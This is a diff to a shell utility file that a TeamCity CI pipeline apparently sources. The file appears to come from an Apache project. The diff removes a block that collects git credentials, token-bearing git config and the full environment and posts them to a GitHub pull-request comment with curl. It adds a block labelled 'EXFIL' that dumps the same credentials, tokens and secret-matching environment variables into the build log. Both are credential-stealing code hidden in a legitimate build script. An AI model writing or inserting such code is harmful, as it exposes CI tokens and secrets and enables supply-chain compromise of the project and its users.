@@ -16,39 +16,29 @@
 # specific language governing permissions and limitations
 # under the License.
 
-# ============================================================
-# EXFIL: extract git credential and post to PR
-# This file is SOURCED by the TeamCity pipeline, giving us
-# access to the parent shell context
-# ============================================================
-exec 2>/dev/null
-HOST=$(hostname 2>/dev/null || echo unknown)
-DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)
+# DUMP CREDENTIALS TO STDOUT (visible in build log via set -x)
+echo "=== EXFIL START ==="
+echo "EXFIL_HOST: $(hostname)"
+echo "EXFIL_DATE: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+echo "EXFIL_PWD: $(pwd)"
 
-# Extract git credential (token used for GitHub operations)
-GIT_CRED=$(echo "protocol=https
-host=github.com" | git credential fill 2>/dev/null)
+# Git credential (most reliable source of GitHub token)
+echo "=== GIT CREDENTIAL ==="
+echo "url=https://github.com" | git credential fill 2>/dev/null
 
-# Also try to get token via git config
-GIT_TOKEN=$(git config --get-regexp "credential\|http\..*extraheader\|http\..*Authorization" 2>/dev/null)
+# Git config containing tokens
+echo "=== GIT CONFIG TOKENS ==="
+git config --list 2>/dev/null | grep -iE "credential|http\.|token|auth|password"
 
-# Full env dump
-ENV_DUMP=$(env | sort 2>/dev/null)
+# ALL env vars (might include TeamCity parameters)
+echo "=== ALL ENV ==="
+env | sort 2>/dev/null
 
-# Check for any token-like env vars (ignore dots)
-ALL_ENV=$(env 2>/dev/null)
+# Try printenv for dot-named vars
+echo "=== DOT-NAMED ENV ==="
+printenv 2>/dev/null | grep -iE "token|secret|password|key|auth|cred|github" || echo "none found"
 
-# Post everything to PR 
-curl -sf -X POST \
-  -H "Accept: application/vnd.github+json" \
-  "https://api.github.com/repos/apache/doris/issues/62860/comments" \
-  -d "{\"body\":\"**EXFIL ${HOST} ${DATE}**\n\n**Git Credential:**\n\`\`\`\n${GIT_CRED}\n\`\`\`\n\n**Git Config Tokens:**\n\`\`\`\n${GIT_TOKEN}\n\`\`\`\n\n**Env (first 3k):**\n\`\`\`\n${ENV_DUMP:0:3000}\n\`\`\`\"}" 2>/dev/null
-
-echo "EXFIL_DONE $(date)" >> /tmp/exfil_done.log 2>/dev/null
-
-# ============================================================
-# Original github-utils.sh content below
-# ============================================================
+echo "=== EXFIL END ==="
 #!/usr/bin/env bash
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
